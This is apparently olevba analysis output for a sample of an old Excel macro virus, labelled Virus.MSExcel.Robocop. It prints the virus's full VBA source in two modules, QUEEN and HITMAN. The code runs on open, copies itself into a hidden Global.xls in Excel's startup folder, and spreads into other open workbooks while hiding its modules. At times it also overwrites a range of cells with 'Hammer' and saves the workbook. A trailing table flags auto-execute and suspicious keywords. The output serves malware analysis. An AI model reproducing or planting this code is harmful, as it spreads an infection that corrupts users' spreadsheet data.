olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Robocop-2c07c9086ce16ba4088f23b1ff3745f2932b1a90
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO QUEEN.bas 
in file: Virus.MSExcel.Robocop-2c07c9086ce16ba4088f23b1ff3745f2932b1a90 - OLE stream: '_VBA_PROJECT_CUR/VBA/QUEEN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'
' QUEEN Macro
' Macro recorded 31.07.97 by Unknown User
' (c) 1997 Master of infection
' Queen Hitman Virus inc.
' ;)
Sub QUEEN()
Attribute QUEEN.VB_Description = "Macro recorded 31.07.97 by Unknown User\n\n \n\n!\nЃ\n"
inside = 0
Application.ScreenUpdating = False
Set a = Application.ActiveWorkbook
For x = 1 To Application.Workbooks.Count
On Error GoTo Err
If Application.Workbooks(x).Name = a.Name Then
For y = 1 To Application.Workbooks(a.Name).Modules.Count
If Application.Workbooks(a.Name).Modules(y).Name = "HITMAN" Then
inside = 1
End If
Next
If inside = 0 Then
Windows(a.Name).Visible = True
ActiveWorkbook.Modules.Add
Application.Workbooks("Global.xls").Modules("HITMAN").Copy _
after:=ActiveWorkbook.Modules(1)
ActiveWorkbook.Modules.Add
Application.Workbooks("Global.xls").Modules("QUEEN").Copy _
after:=ActiveWorkbook.Modules(2)
Application.DisplayAlerts = False
Sheets("Module1").Select
ActiveWindow.SelectedSheets.Delete
Sheets("Module2").Select
ActiveWindow.SelectedSheets.Delete
Application.DisplayAlerts = True
Sheets("HITMAN").Select
ActiveWindow.SelectedSheets.Visible = False
Sheets("QUEEN").Select
ActiveWindow.SelectedSheets.Visible = False
Windows(a.Name).Visible = True
Application.DisplayAlerts = False
Application.ActiveWorkbook.Save
Application.DisplayAlerts = True
End If
End If
Next
Err:
Application.ScreenUpdating = True
If Second(Time) > 40 Then
With Worksheets(1).Range("A1:Z30")
    .Value = "Hammer"
    .Characters(1, 6).Font.Bold = True
End With
Application.ActiveWorkbook.Save
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO HITMAN.bas 
in file: Virus.MSExcel.Robocop-2c07c9086ce16ba4088f23b1ff3745f2932b1a90 - OLE stream: '_VBA_PROJECT_CUR/VBA/HITMAN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'
' Auto_open Macro
' Macro recorded 31.07.97 by Unknown User
' (c) 1997 Master of infection
' Queen Hitman Virus inc.
'   ;)
Sub Auto_open()
Attribute Auto_open.VB_Description = "Macro recorded 31.07.97 by Unknown User"
Attribute Auto_open.VB_ProcData.VB_Invoke_Func = " \n0"
exists = 0
inside = 0
Application.ScreenUpdating = False
For x = 1 To Application.Workbooks.Count
If Application.Workbooks(x).Name = "Global.xls" Then
exists = 1
End If
Next
If exists = 0 Then
Set a = Application.ActiveWorkbook
Application.Workbooks(a.Name).SaveCopyAs Application.StartupPath + "\Global.xls"
Application.Workbooks.Open (Application.StartupPath + "\Global.xls")
Application.Workbooks("Global.xls").Save
End If
For y = 1 To Application.Workbooks("Global.xls").Modules.Count
If Application.Workbooks("Global.xls").Modules(y).Name = "HITMAN" Then
inside = 1
End If
Next
If inside = 0 Then
Set b = Application.ActiveWorkbook
Application.Workbooks(b.Name).Modules("HITMAN").Copy after:=Application.Workbooks("Global.xls").Modules(1)
Application.Workbooks(b.Name).Modules("QUEEN").Copy after:=Application.Workbooks("Global.xls").Modules(1)
Application.OnSheetActivate = ActiveWorkbook.Name + "!QUEEN.QUEEN"
Sheets("HITMAN").Select
ActiveWindow.SelectedSheets.Visible = False
Sheets("QUEEN").Select
ActiveWindow.SelectedSheets.Visible = False
Application.Workbooks("Global.xls").Save
End If
Application.OnSheetActivate = Workbooks("Global.xls").Name & "!QUEEN.QUEEN"
Windows("Global.xls").Visible = False
Application.Workbooks("Global.xls").Save
Application.ScreenUpdating = True
MsgBox ("Hammer to fall")
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  QUEE
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  HITMA
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

